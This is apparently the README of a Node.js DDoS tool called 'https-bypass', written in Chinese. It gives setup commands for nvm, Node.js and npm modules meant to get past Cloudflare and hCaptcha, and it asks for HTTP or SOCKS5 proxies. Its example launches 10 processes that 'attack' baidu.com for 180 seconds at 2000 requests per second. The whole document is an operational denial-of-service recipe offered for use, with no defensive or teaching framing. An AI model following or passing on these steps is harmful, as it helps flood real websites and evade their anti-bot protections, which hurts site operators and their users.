# 需要到HTTP或SOCKS5代理
# 自行解决

### 部署nodejs
#### 使用git安装nvm
`git clone git://github.com/creationix/nvm.git ~/nvm`

#### 下载完成后加入系统环境

`source   ~/.bashrc`

#### nvm安装nodejs
`nvm install 16.15.0`
#### 如需要安装另外的版本

`nvm install 版本号`

#### 安装
```shell
git clone https://github.com/piokto/https-bypass.git
cd https-bypass
```
#### 安装npm模块
```shell
npm i requests
npm i https-proxy-agent
npm i crypto-random-string
npm i events
npm i fs
npm i net
npm i cloudscraper
npm i request
npm i hcaptcha-solver
npm i randomstring
npm i cluster
npm i cloudflare-bypasser
```
```shell
example：
node https-bypass.js GET 10 https://baidu.com 180 2000
使用GET 运行10个node进程攻击目标180秒 每秒2000次访问
```





